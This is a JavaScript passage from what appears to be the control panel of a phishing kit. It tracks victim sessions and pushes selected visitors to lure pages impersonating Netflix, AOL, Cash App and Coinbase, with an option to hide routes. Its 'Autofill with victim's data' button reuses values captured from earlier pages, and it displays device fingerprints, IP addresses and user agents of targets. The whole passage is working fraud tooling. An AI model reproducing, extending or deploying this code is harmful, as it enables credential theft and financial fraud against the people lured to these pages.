      state.showRequiredInfoError = false;
      
      const grid = document.getElementById('userInputDataGrid');
      const dynamicPanels = Array.from(grid.children).filter(child => 
          !child.classList.contains('collapsible-section-fixed'));
      dynamicPanels.forEach(panel => grid.removeChild(panel));
      
      sessionManager.style.display = 'none';
  }

  
  function setSessionManagerTab(tab) {
    state.sessionManagerActiveTab = tab;
    sessionManagerTabs.forEach(t => {
      t.classList.toggle('active-tab', t.getAttribute('data-tab') === tab);
    });
    
    Object.keys(tabContents).forEach(key => {
      tabContents[key].style.display = 'none';
      tabContents[key].classList.remove('active-tab');
      
      if (key === 'fingerprint' && key !== tab) {
        const fingerprintOutput = document.getElementById('fingerprintOutput');
        if (fingerprintOutput) {
          fingerprintOutput.innerHTML = '';
        }
      }
    });
    
    if (tabContents[tab]) {
      tabContents[tab].style.display = 'block';
      tabContents[tab].classList.add('active-tab');
    }
    
    if (tab === 'activity' && state.selectedSession) {
      renderActivityTimeline();
    }
    
    if (tab === 'fingerprint' && state.selectedSession) {
      renderFingerprintTab();
    }
    
    sendToUserButton = document.getElementById('sendToUser') || document.getElementById('executeWorkflow');
    
    if (sendToUserButton) {
      if (tab === 'workflow') {
        if (!sendToUserButton.hasAttribute('data-original-html')) {
          sendToUserButton.setAttribute('data-original-html', sendToUserButton.innerHTML);
        }
        
        sendToUserButton.innerHTML = 'Execute Workflow';
        
        if (sendToUserButton.id === 'sendToUser') {
          const newButton = sendToUserButton.cloneNode(true);
          newButton.id = 'executeWorkflow';
          sendToUserButton.parentNode.replaceChild(newButton, sendToUserButton);
          sendToUserButton = newButton;
          
          sendToUserButton.addEventListener('click', executeWorkflowAction);
        }
        
        const hasWorkflowItems = document.querySelectorAll('#workflowMainList .workflow-card, #workflowMainList .card-preview').length > 0;
        if (hasWorkflowItems) {
          sendToUserButton.classList.remove('btn-disabled');
          sendToUserButton.classList.add('btn-primary');
          sendToUserButton.style.cursor = 'pointer';
        } else {
          sendToUserButton.classList.add('btn-disabled');
          sendToUserButton.classList.remove('btn-primary');
          sendToUserButton.style.cursor = 'not-allowed';
        }
      } else {
        if (sendToUserButton.id === 'executeWorkflow') {
          const newButton = sendToUserButton.cloneNode(true);
          newButton.id = 'sendToUser';
          
          if (newButton.hasAttribute('data-original-html')) {
            newButton.innerHTML = newButton.getAttribute('data-original-html');
          }
          
          sendToUserButton.parentNode.replaceChild(newButton, sendToUserButton);
          sendToUserButton = newButton;
          
          sendToUserButton.addEventListener('click', sendToUserAction);
          
          updateSessionManager();
        }
      }
    }
  }


  document.querySelectorAll('.collapsible-section .btn-secondary').forEach(btn => {
    if (btn.textContent.trim() === 'View Image') {
      btn.addEventListener('click', function(e) {
        const img = btn.closest('.group').querySelector('img');
        if (img && img.src) {
          window.open(img.src, '_blank');
        }
      });
    }
  });

  function handleRequiredInfoChange(e) {
    const pageControlInput = e.target;
    const dataVar = pageControlInput.dataset.var;
    const newValue = pageControlInput.value;
    const pageContext = currentPageId;


    if (!pageContext || !dataVar) {
        return;
    }
    updatePlaceholder(dataVar, newValue, pageContext);

    try {
        const selector = `.step-input[data-page="${pageContext}"][data-placeholder-name="${dataVar}"]`;
        const correspondingStepInput = document.querySelector(selector);

        if (correspondingStepInput) {
            if (correspondingStepInput.value !== newValue && !correspondingStepInput.disabled) {
                correspondingStepInput.value = newValue;
            } else if (correspondingStepInput.disabled) {
            } else if (correspondingStepInput.value === newValue) {
            }
        } else {
        }
    } catch (error) {
        logErrorToServer({
             message: "Error syncing page control input to step input",
             error: error.toString(),
             stack: error.stack,
             context: { pageContext, dataVar }
         });
    }
}

  function updatePlaceholder(placeholderName, newValue, page) {
    if (!state.selectedSession) return;
    
    if (!state.selectedSession.placeholders) {
      state.selectedSession.placeholders = {};
    }
    
    state.selectedSession.placeholders[placeholderName] = newValue;
    socket.emit('placeholder_set', {
      session_id: state.selectedSession.id,
      placeholder_name: placeholderName,
      placeholder_value: newValue,
      page_name: page
    });
  }

  function selectPage(pageId) {
    const selectedPageData = state.availablePages.find(pg => pg.id === pageId);
    if (!selectedPageData) return;
    state.selectedPage = pageId;
    
    const waitingRoute = state.config?.waiting;
    const previewImgSrc = selectedPageData.preview_image || waitingRoute;
    
    if (pagePreview) {
       pagePreview.innerHTML = `<img src="${previewImgSrc}" alt="Preview" class="w-full h-full object-cover">`;
       pagePreview.scrollIntoView({ behavior: 'smooth' });
    } else {
    }
    if(requiredInfoContainer) {
       requiredInfoContainer.innerHTML = '';
    } else {
       return; 
    }

    const pageName = selectedPageData.id.replace(/^\/+/, '');

    if (selectedPageData.required_data && Array.isArray(selectedPageData.required_data) && selectedPageData.required_data.length > 0) {
        state.showRequiredInfo = true;
        requiredInfoContainer.classList.remove('hidden');

        selectedPageData.required_data.forEach((field, i) => {
             if (!field) return; 

            const label = document.createElement('label');
            label.className = 'block text-sm font-medium text-text-light dark:text-text-color mb-1';
            label.textContent = field.value || `Field ${i + 1}`;

            const wrapper = document.createElement('div');
            wrapper.className = 'flex items-center gap-2 mb-2';

            const input = document.createElement('input');
            input.type = field.type || 'text';
            input.placeholder = field.placeholder || '';
            input.className = 'flex-1 w-full'; 
            const placeholderVar = field.placeholder_name || field.value || `placeholder_${i}`;
            input.setAttribute('data-var', placeholderVar);
            
            let existingValue = '';
            if (state.selectedSession?.placeholders && state.selectedSession.placeholders[pageName] && state.selectedSession.placeholders[pageName][placeholderVar] !== undefined) {
               existingValue = state.selectedSession.placeholders[pageName][placeholderVar];
            } else if (state.workflowInputValues && state.workflowInputValues[pageName] && state.workflowInputValues[pageName][placeholderVar] !== undefined){
               existingValue = state.workflowInputValues[pageName][placeholderVar];
            }

            let linkedValues = [];
            
            if (state.selectedSession && state.config?.data_links) {
                const relevantLinks = state.config.data_links.filter(link => 
                    (link.to === pageName || link.to === selectedPageData.id) && 
                    (link.to_value === placeholderVar || link.to_value === field.value)
                );

                relevantLinks.forEach(link => {
                    if (state.selectedSession.values && state.selectedSession.values[link.from]) {
                        const sourceValue = state.selectedSession.values[link.from][link.from_value];
                        if (sourceValue && !linkedValues.includes(sourceValue)) {
                            linkedValues.push(sourceValue);
                        }
                    }
                    
                    const fromWithoutSlash = link.from.replace(/^\/+/, '');
                    const fromWithSlash = '/' + fromWithoutSlash;
                    
                    [fromWithoutSlash, fromWithSlash].forEach(fromKey => {
                        if (state.selectedSession.values && state.selectedSession.values[fromKey]) {
                            const sourceValue = state.selectedSession.values[fromKey][link.from_value];
                            if (sourceValue && !linkedValues.includes(sourceValue)) {
                                linkedValues.push(sourceValue);
                            }
                        }
                    });
                });
            }
            
            if (state.selectedSession && state.selectedSession.values) {
                Object.entries(state.selectedSession.values).forEach(([pageKey, pageValues]) => {
                    if (pageValues && pageValues[placeholderVar]) {
                        if (!linkedValues.includes(pageValues[placeholderVar])) {
                            linkedValues.push(pageValues[placeholderVar]);
                        }
                    }
                    if (field.value && pageValues && pageValues[field.value]) {
                        if (!linkedValues.includes(pageValues[field.value])) {
                            linkedValues.push(pageValues[field.value]);
                        }
                    }
                });
            }
            
            let debounceTimeout;
            input.addEventListener('input', function(e) {
              state.requiredInfoValue = e.target.value;
              updateSessionManager();

              if (debounceTimeout) clearTimeout(debounceTimeout);
              debounceTimeout = setTimeout(() => {
                const newValue = input.value;
                updatePlaceholder(placeholderVar, newValue, selectedPageData.id.replace(/^\/+/, ''));
              }, 800);
            });

            input.value = existingValue;

            if (selectedPageData.required_data.length === 1) {
                state.requiredInfoValue = existingValue;
            }
            
            wrapper.appendChild(input);
            
            if (linkedValues.length > 0) {
                const autofillBtn = document.createElement('button');
                autofillBtn.className = 'flex items-center justify-center w-8 h-8 bg-primary/10 hover:bg-primary/20 rounded transition-colors ml-2';
                autofillBtn.innerHTML = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" 
                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="9 11 12 14 22 4"></polyline>
                        <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
                    </svg>
                `;
                autofillBtn.title = "Autofill with victim's data";
                
                autofillBtn.addEventListener('click', function() {
                    if (linkedValues.length > 0) {
                        input.value = linkedValues[0];
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        
                        if (typeof showToast === 'function') {
                            showToast('Field autofilled with victim data', 'success');
                        }
                    }
                });
                
                wrapper.appendChild(autofillBtn);
            }
            
            requiredInfoContainer.appendChild(label);
            requiredInfoContainer.appendChild(wrapper);
        });
    } else {
        state.showRequiredInfo = false;
        if (requiredInfoContainer) { 
          requiredInfoContainer.classList.add('hidden');
        }
        state.requiredInfoValue = ''; 
    }
    updateSessionManager(); 
    updateInputsBasedOnConnections();
}
  

  function getPreviewImgSrc(pageId) {
    const selectedPageData = state.availablePages.find(page => page.id === pageId);
    return selectedPageData ? selectedPageData.previewImgSrc || 'https://i.kym-cdn.com/editorials/icons/mobile/000/009/138/freaky_memes.jpg' : 'https://i.kym-cdn.com/editorials/icons/mobile/000/009/138/freaky_memes.jpg';
  }

  function getInputPlaceholder(pageId) {
    const selectedPageData = state.availablePages.find(page => page.id === pageId);
    return selectedPageData ? selectedPageData.placeholder || 'Enter required information' : 'Enter required information';
  }

  function shortenSessionId(sessionId) {
    return sessionId.length > 8 ? sessionId.substring(0, 8) + '...' : sessionId;
  }

  function sendToUserAction() {
    if (!state.selectedPage) return;
    
    if (state.showRequiredInfo && !state.requiredInfoValue.trim()) {
      state.showRequiredInfoError = true;
      requiredInfoError.classList.remove('hidden');
      return;
    }
    
    if (state.selectedSession && state.selectedPage) {
      const selectedPageObj = state.availablePages.find(p => p.id === state.selectedPage);
      
      if (selectedPageObj) {
        const redirectPath = state.selectedPage;
        
        state.selectedSession.current_page = redirectPath;
        showToast(`Sent ${shortenSessionId(state.selectedSession.id)} to page ${redirectPath}`, 'success');
        
        socket.emit('request_redirect', { 
          session_id: state.selectedSession.id, 
          redirect: redirectPath, 
          hide_route: document.getElementById('hide_routeToggle').checked
        });
      }
    }
    
    renderSessionsTable();
    renderAvailablePages();
  }
  

  function handleCopyUserAgent() {
    if (!state.selectedSession) return;
    navigator.clipboard.writeText(state.selectedSession.user_agent || "Unknown user agent")
      .then(() => showToast('Copied to clipboard', 'success'))
      .catch(err => showToast('Failed to copy', 'error'));
  }
   
  function handleCopyIp() {
    if (!state.selectedSession) return;
    navigator.clipboard.writeText(state.selectedSession.ip)
      .then(() => showToast('Copied to clipboard', 'success'));
  }

  function renderAvailablePages() {
    const categoryNavContainer = document.getElementById('categoryNavContainer');
    const availablePagesContainer = document.getElementById('availablePages');
  
    const iconMap = {
        netflix: '<path d="M10.5 2H13.5L7.5 22H4.5L10.5 2Z"/> <path d="M13.5 2H16.5L10.5 22H7.5L13.5 2Z"/>',
        aol: '<circle cx="12" cy="12" r="10"/> <path d="M8 14v-4h8v4"/> <path d="M8 10h8"/> <path d="M12 14v-4"/>',
        cashapp: '<path d="M17 12h-5"/><path d="M12 17V7"/><path d="M12 7H7"/><path d="M7 7v10h10v-3"/><path d="M17 12v-2"/>',
        coinbase: '<path d="M6 12h12"/><path d="M6 12c0-3.31 2.69-6 6-6s6 2.69 6 6-2.69 6-6 6-6-2.69-6-6z"/>',
        default: '<rect width="18" height="18" x="3" y="3" rx="2"/><path d="M8 12h8"/><path d="M12 8v8"/>' 
    };
  
    const categories = new Set(['ALL']);
    state.availablePages.forEach(page => {
        const category = page.id.split('_')[0];
        if (category && page.id.includes('_')) categories.add(category);
    });
  
    if (!state.selectedCategory) state.selectedCategory = 'ALL';
  
    const categoryNav = `
        <div class="relative">
            <div id="categoriesContainer" class="flex overflow-x-auto gap-2 mb-4 pb-2 categories-nav scroll-smooth no-scrollbar cursor-grab active:cursor-grabbing">
                ${Array.from(categories).map(category => `
                    <button data-category="${category}"
                            class="category-btn whitespace-nowrap px-4 py-2 rounded-lg transition-all duration-200
                            ${state.selectedCategory === category ? 'btn-primary' : 'btn-secondary'}">
                        ${category.toUpperCase()}
                    </button>
                `).join('')}
            </div>
        </div>
    `;
  
    const filteredPages = state.availablePages.filter(page => {
        if (state.selectedCategory === 'ALL') return true;
        return page.id.startsWith(state.selectedCategory + '_');
    });
  
    const pageButtonsHtml = filteredPages.map(page => {
        const highlight = (state.selectedPage && state.selectedPage === page.id) ||
                        (!state.selectedPage && state.selectedSession && state.selectedSession.current_page === page.id);
        const btnClass = highlight ? "btn-primary" : "btn-secondary";
        const iconKey = page.id.split('_')[0];
        const icon = iconMap[iconKey] || iconMap.default; 
  
        return `
            <div class="relative mt-2">
                <div class="edit-page-btn absolute top-2 left-2 p-0.5 z-20 rounded bg-gray-700/50 hover:bg-gray-600/70 cursor-pointer" data-page-id="${page.id}">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-pencil-icon lucide-pencil">
                        <path d="M21.174 6.812a1 1 0 0 0-3.986-3.987L3.842 16.174a2 2 0 0 0-.5.83l-1.321 4.352a.5.5 0 0 0 .623.622l4.353-1.32a2 2 0 0 0 .83-.497z"/>
                        <path d="m15 5 4 4"/>
                    </svg>
                </div>
                <button data-page="${page.id}" class="page-btn flex items-center gap-3 p-4 rounded-xl transition-all duration-200 ${btnClass} w-full">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        ${icon}
                    </svg>
                    <span class="text-sm font-medium">${page.label}</span>
                </button>
            </div>
        `;
    }).join('');
  
    if (categoryNavContainer) {
        categoryNavContainer.innerHTML = categoryNav;
        
        const categoriesContainer = document.getElementById('categoriesContainer');
        
        const style = document.createElement('style');
        if (!document.getElementById('category-scroll-style')) {
            style.id = 'category-scroll-style';
            style.textContent = `
                .no-scrollbar::-webkit-scrollbar {
                    display: none;
                }
                .no-scrollbar {
                    -ms-overflow-style: none;
                    scrollbar-width: none;
                }
            `;
            document.head.appendChild(style);
        }
        
        let isDown = false;
        let startX;
        let scrollLeft;
        
        categoriesContainer.addEventListener('mousedown', (e) => {
            if (e.target.classList.contains('category-btn')) {
                return;
            }
            isDown = true;
            categoriesContainer.classList.add('active');
            startX = e.pageX - categoriesContainer.offsetLeft;
            scrollLeft = categoriesContainer.scrollLeft;
            e.preventDefault(); 
        });
        
        categoriesContainer.addEventListener('mouseleave', () => {
            isDown = false;
            categoriesContainer.classList.remove('active');
        });
        
        categoriesContainer.addEventListener('mouseup', () => {
            isDown = false;
            categoriesContainer.classList.remove('active');
        });
        
        categoriesContainer.addEventListener('mousemove', (e) => {
            if (!isDown) return;
            e.preventDefault();
            const x = e.pageX - categoriesContainer.offsetLeft;
            const walk = (x - startX) * 2; 
            categoriesContainer.scrollLeft = scrollLeft - walk;
        });
  
        categoriesContainer.querySelectorAll('.category-btn').forEach(btn => {
            const newBtn = btn.cloneNode(true);
            btn.parentNode.replaceChild(newBtn, btn);
            newBtn.addEventListener('click', () => {
                state.selectedCategory = newBtn.getAttribute('data-category');
                renderAvailablePages(); 
            });
        });
        
    } else {
    }
  
    if (availablePagesContainer) {
        availablePagesContainer.innerHTML = pageButtonsHtml;
  
        availablePagesContainer.querySelectorAll('.page-btn').forEach(btn => {
            const newBtn = btn.cloneNode(true);
             btn.parentNode.replaceChild(newBtn, btn);
            newBtn.addEventListener('click', (e) => {
                 if (e.target.closest('.edit-page-btn')) return; 
  
                const pageId = newBtn.getAttribute('data-page');
                state.selectedPage = pageId;
                currentPage = pageId.replace('/', ''); 
                updatePreview(currentPage); 
                selectPage(pageId); 
                updateSessionManager(); 
                renderAvailablePages(); 
            });
        });
  
        availablePagesContainer.querySelectorAll('.edit-page-btn').forEach(btn => {
             const newBtn = btn.cloneNode(true);
             btn.parentNode.replaceChild(newBtn, btn);
            newBtn.addEventListener('click', async (e) => {
                e.preventDefault();
                e.stopPropagation();
  
                const pageId = newBtn.getAttribute('data-page-id');
                const page = state.availablePages.find(p => p.id === pageId);
                if (page) {
                    try {
                        const config = await fetchConfiguration();
                        const pageKey = page.id.replace('/', '');
                        const pageConfig = config.pages[pageKey];
                        const currentRoute = pageConfig && pageConfig.route ? pageConfig.route : '';
  
                        const newRoute = await showInputBoxModal(`Edit route for "${page.label}"`, currentRoute, "Save"); 
  
                        if (newRoute !== null && newRoute !== undefined) { 
                            const formattedRoute = newRoute.startsWith('/') ? newRoute : `/${newRoute}`;
  
                            if (!config.pages[pageKey]) {
                               config.pages[pageKey] = {}; 
                            }
                            config.pages[pageKey].route = formattedRoute;
  
                            socket.emit('save_routes', {
                                pageKey: pageKey,
                                route: formattedRoute,
                                pageLabel: page.label
                            });
  
                            state.config = config; 
  
                            showToast(`Route for ${page.label} updated to ${formattedRoute}`, 'success');
                        } else if (newRoute === null) {
                        }
                    } catch (error) {
                        logErrorToServer(error); 
                        showToast('Failed to update page route', 'error');
                    }
                }
  
                return false; 
            });
        });
  
    } else {
    }
  }

  const previewContainer = document.getElementById('pagePreview');
  const previewImg = previewContainer.querySelector('img');
  const loading = document.getElementById('pagePreviewLoading');
  const viewingPageText = document.getElementById('viewingPageText');
  const LOAD_TIMEOUT = 20000;

  async function updatePreview(pagePath) {
      let loadingTimeout;
      
      try {
          previewImg.classList.add('blur-loading', 'opacity-80');
          loading.classList.remove('hidden');
          viewingPageText.textContent = '/loading...';

          loadingTimeout = setTimeout(() => {
              loading.classList.add('hidden');
          }, 500);

          const config = await fetchConfiguration();
          const pageConfig = config.pages[pagePath];
          
          if (!pageConfig) {
              throw new Error('Page not found in configuration');
          }

          const imagePath = pageConfig.preview_image;
          if (!imagePath) {
              throw new Error('No preview image configured');
          }

          await new Promise((resolve, reject) => {
              previewImg.onload = resolve;
              previewImg.onerror = () => reject(new Error('Failed to load preview image'));
              
              previewImg.src = `${imagePath}?t=${Date.now()}`;
              
              setTimeout(() => reject(new Error('Preview image load timeout')), LOAD_TIMEOUT);
          });

          viewingPageText.textContent = `/${pagePath}`;
      } catch (error) {
          logErrorToServer(error);
          previewImg.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIyIj48cGF0aCBkPSJNMTIgMkM2LjQ4IDIgMiA2LjQ4IDIgMTJzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnptMSAxNWgtMnYtMmgydjJ6bTAtNGgtMlY3aDJ2NnoiLz48L3N2Zz4=';
          showToast(`Preview failed: ${error.message}`, 'error');
      } finally {
          clearTimeout(loadingTimeout);
          loading.classList.add('hidden');
          previewImg.classList.remove('blur-loading', 'opacity-80');
      }
  }

  function createPreviewIframe(path) {
      return new Promise((resolve, reject) => {
          const frame = document.createElement('iframe');
          const timeout = setTimeout(() => {
              reject(new Error(`Load timeout after ${LOAD_TIMEOUT/1000}s`));
              frame.remove();
          }, LOAD_TIMEOUT);

          frame.style.cssText = `
              position: fixed;
              left: -9999px;
              width: ${PREVIEW_DIMENSIONS.width}px;
              height: ${PREVIEW_DIMENSIONS.height}px;
              border: 0;
              visibility: visible;
          `;

          const observer = new MutationObserver((_, obs) => {
              if (isFrameReady(frame)) {
                  clearTimeout(timeout);
                  obs.disconnect();
                  resolve(frame);
              }
          });

          frame.onload = () => {
              try {
                  observer.observe(frame.contentDocument, {
                      childList: true,
                      subtree: true,
                      attributes: true
                  });
                  if (isFrameReady(frame)) {
                      clearTimeout(timeout);
                      observer.disconnect();
                      resolve(frame);
                  }
              } catch (error) {
                  reject(error);
              }
          };

          frame.onerror = (error) => {
              clearTimeout(timeout);
              observer.disconnect();
              reject(error);
          };

          frame.src = `${path}?preview=true&ts=${Date.now()}`;
          document.body.appendChild(frame);
      });
  }

  function isFrameReady(frame) {
      return frame.contentDocument?.body?.children.length > 0 &&
            frame.contentDocument.readyState === 'complete' &&
            document.visibilityState === 'visible';
  }

  async function renderFingerprintTab() {
    const fingerprintOutput = document.getElementById('fingerprintOutput');
    const copyButton = document.getElementById('copyFingerprintBtn');
    
    if (!fingerprintOutput) {
      return;
    }
    if (!copyButton) {
    }
    if (!state.selectedSession) {
      fingerprintOutput.innerHTML = '<div class="col-span-full flex items-center justify-center h-32 text-text-light/60 dark:text-text-color/60">No session selected.</div>';
      return;
    }
    
    try {
      const fingerprintInfo = state.selectedSession.fingerprint_info;
      if (fingerprintInfo) {
        const parsedInfo = JSON.parse(fingerprintInfo);
        const details = parsedInfo.details;
  
        const icons = { 
          apple: `<svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>`,
          android: `<svg class="w-8 h-8" fill="currentColor" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M120.606,169h270.788v220.663c0,13.109-10.628,23.737-23.721,23.737h-27.123v67.203c0,17.066-13.612,30.897-30.415,30.897c-16.846,0-30.438-13.831-30.438-30.897v-67.203h-47.371v67.203c0,17.066-13.639,30.897-30.441,30.897c-16.799,0-30.437-13.831-30.437-30.897v-67.203h-27.099c-13.096,0-23.744-10.628-23.744-23.737V169z M67.541,167.199c-16.974,0-30.723,13.963-30.723,31.2v121.937c0,17.217,13.749,31.204,30.723,31.204c16.977,0,30.723-13.987,30.723-31.204V198.399C98.264,181.162,84.518,167.199,67.541,167.199z M391.395,146.764H120.606c3.342-38.578,28.367-71.776,64.392-90.998l-25.746-37.804c-3.472-5.098-2.162-12.054,2.946-15.525c5.102-3.471,12.044-2.151,15.533,2.943l28.061,41.232c15.558-5.38,32.446-8.469,50.208-8.469c17.783,0,34.672,3.089,50.229,8.476L334.29,5.395c3.446-5.108,10.41-6.428,15.512-2.957c5.108,3.471,6.418,10.427,2.946,15.525l-25.725,37.804C363.047,74.977,388.055,108.175,391.395,146.764z M213.865,94.345c0-8.273-6.699-14.983-14.969-14.983c-8.291,0-14.99,6.71-14.99,14.983c0,8.269,6.721,14.976,14.99,14.976S213.865,102.614,213.865,94.345z M329.992,94.345c0-8.273-6.722-14.983-14.99-14.983c-8.291,0-14.97,6.71-14.97,14.983c0,8.269,6.679,14.976,14.97,14.976C323.271,109.321,329.992,102.614,329.992,94.345z M444.48,167.156c-16.956,0-30.744,13.984-30.744,31.222v121.98c0,17.238,13.788,31.226,30.744,31.226c16.978,0,30.701-13.987,30.701-31.226v-121.98C475.182,181.14,461.458,167.156,444.48,167.156z"/></svg>`,
          nvidia: `<svg class="w-8 h-8" viewBox="35.188 -14.828 351.46 351.46" xmlns="http://www.w3.org/2000/svg" fill="#77b900"><path d="M82.211 102.414s22.504-33.203 67.437-36.638V53.73c-49.769 3.997-92.867 46.149-92.867 46.149s24.41 70.564 92.867 77.026v-12.804c-50.237-6.32-67.437-61.687-67.437-61.687zm67.437 36.223v11.727c-37.968-6.77-48.507-46.237-48.507-46.237s18.23-20.195 48.507-23.47v12.867c-.023 0-.039-.007-.058-.007-15.891-1.907-28.305 12.938-28.305 12.938s6.958 24.99 28.363 32.182m0-107.125V53.73c1.461-.112 2.922-.207 4.391-.257 56.582-1.907 93.449 46.406 93.449 46.406s-42.343 51.488-86.457 51.488c-4.043 0-7.828-.375-11.383-1.005v13.739a75.04 75.04 0 0 0 9.481.612c41.051 0 70.738-20.965 99.484-45.778 4.766 3.817 24.278 13.103 28.289 17.167-27.332 22.884-91.031 41.33-127.144 41.33-3.481 0-6.824-.211-10.11-.528v19.306H305.68V31.512H149.648zm0 49.144V65.777c1.446-.101 2.903-.179 4.391-.226 40.688-1.278 67.382 34.965 67.382 34.965s-28.832 40.042-59.746 40.042c-4.449 0-8.438-.715-12.028-1.922V93.523c15.84 1.914 19.028 8.911 28.551 24.786l21.181-17.859s-15.461-20.277-41.524-20.277c-2.834-.001-5.545.198-8.207.483"/></svg>`,
          amd: `<svg class="w-8 h-8" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" fill="#000000"><polygon style="fill:none;stroke:#000000;stroke-linecap:round;stroke-linejoin:round;" points="33.614 33.614 42.864 42.864 42.864 5.864 5.864 5.864 15.114 15.114 33.614 15.114 33.614 33.614"/><polygon style="fill:none;stroke:#000000;stroke-linecap:round;stroke-linejoin:round;" points="15.114 33.614 15.114 19.55 5.885 28.778 5.864 42.864 19.949 42.842 29.177 33.614 15.114 33.614"/></svg>`,
          linux: `<svg class="w-8 h-8" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" fill="#000000"><defs><style>.a{fill:none;stroke:#000000;stroke-linecap:round;stroke-linejoin:round;}.b{fill:#000000;}</style></defs><path class="a" d="M16.2182,35.9c-3.1368,0-6.8982,1.496-7.2988,5.6766a.916.916,0,0,0,.9061,1.0025h11.97A.9.9,0,0,0,22.7,41.643C22.6175,39.8048,21.7865,35.9,16.2182,35.9Z"></path><path class="a" d="M18.0508,20.564c-1.35,1.0368-7.3687,7.51-4.3595,15.6667"></path><path class="a" d="M31.7818,35.9c3.1368,0,6.8982,1.496,7.2988,5.6766a.916.916,0,0,1-.9061,1.0025h-11.97A.9.9,0,0,1,25.3,41.643C25.3825,39.8048,26.2135,35.9,31.7818,35.9Z"></path><path class="a" d="M35.0148,36.4556c3.1848-2.8438,2.7468-7.5246,2.7468-8.7785,2.8935.82,5.0306,2.9709,5.5941,2.17,1.3744-1.9531-7.5193-7.5461-7.6918-10.8989C35.4951,15.6692,35.1706,5.4214,24,5.4214S12.5049,15.6692,12.3361,18.9484c-.1725,3.3528-9.0662,8.9458-7.6918,10.8989.5635.8007,2.7006-1.35,5.5941-2.17,0,1.2539-.438,5.9347,2.7468,8.7785"></path><path class="a" d="M29.2763,19.8324c1.9318,1.5032,8.0416,8.242,5.0324,16.3983"></path><path class="a" d="M24,24.8431l3.9479-4.2791c-.3858-1.0127-1.712-1.929-3.9479-1.929s-3.5621.9163-3.9479,1.929Z"></path><path class="a" d="M20.0521,20.564c-3.424.5063-3.9062-2.7247-3.9062-4.7019,0-2.7006,1.4467-4.4367,3.9062-4.4367S23.79,14.7529,23.79,16.3443A3.8486,3.8486,0,0,1,23.181,18.68"></path><path class="a" d="M27.7205,20.1334c.6751.0482,3.9538-.3892,3.9538-3.331s-1.76-3.7615-4.1232-3.7615a3.7861,3.7861,0,0,0-3.8164,2.6682"></path><path class="a" d="M22.7012,41.4815a6.8371,6.8371,0,0,0,2.6076,0"></path><circle class="b" cx="22.1579" cy="16.5888" r="0.75"></circle><circle class="b" cx="25.5497" cy="16.5888" r="0.75"></circle></svg>`,
          windows: `<svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 93.7l183.6-25.3v177.4H0V93.7zm0 324.6l183.6 25.3V268.4H0v149.9zm203.8 28L448 480V268.4H203.8v177.9zm0-380.6v180.1H448V32L203.8 65.7z"/></svg>`,
          location: `<svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s-8-4.5-8-11.8A8 8 0 0 1 12 2a8 8 0 0 1 8 8.2c0 7.3-8 11.8-8 11.8z"/><circle cx="12" cy="10" r="3"/></svg>`,
          browser: `<svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 8h20M6 2v4M18 2v4"/></svg>`
        };
  
        function getDeviceLogo(userAgent, platform) {
          const uaLower = userAgent?.toLowerCase() || "";
          const platformLower = platform?.toLowerCase() || "";
          if (platformLower.includes('linux')) return icons.linux;
          if (uaLower.includes('android')) return icons.android;
          if (uaLower.includes('iphone') || uaLower.includes('ipad') || platformLower.includes('mac') || platformLower.includes('darwin')) return icons.apple;
          if (platformLower.includes('win')) return icons.windows;
          return icons.windows; 
        }
  
        function getGpuLogo(vendor) {
          const vendorLower = vendor?.toLowerCase() || "";
          if (!vendorLower) return '';
          if (vendorLower.includes('nvidia')) return icons.nvidia;
          if (vendorLower.includes('amd') || vendorLower.includes('ati')) return icons.amd;
          if (vendorLower.includes('apple')) return icons.apple;
          return '';
        }
        
        const cardsData = [
          {
            title: 'Operating System',
            icon: getDeviceLogo(details.userAgent, details.platform),
            value: details.platform || 'Unknown',
            subValue: `Screen: ${details.screenResolution?.width || '?'}x${details.screenResolution?.height || '?'}`
          },
          {
            title: 'Graphics Card',
            icon: getGpuLogo(details.webGL?.unmaskedVendor),
            value: details.webGL?.unmaskedVendor || 'Unknown',
            subValue: details.webGL?.unmaskedRenderer || 'Not available'
          },
          {
            title: 'Location & Time',
            icon: icons.location,
            value: details.timezone || 'Unknown',
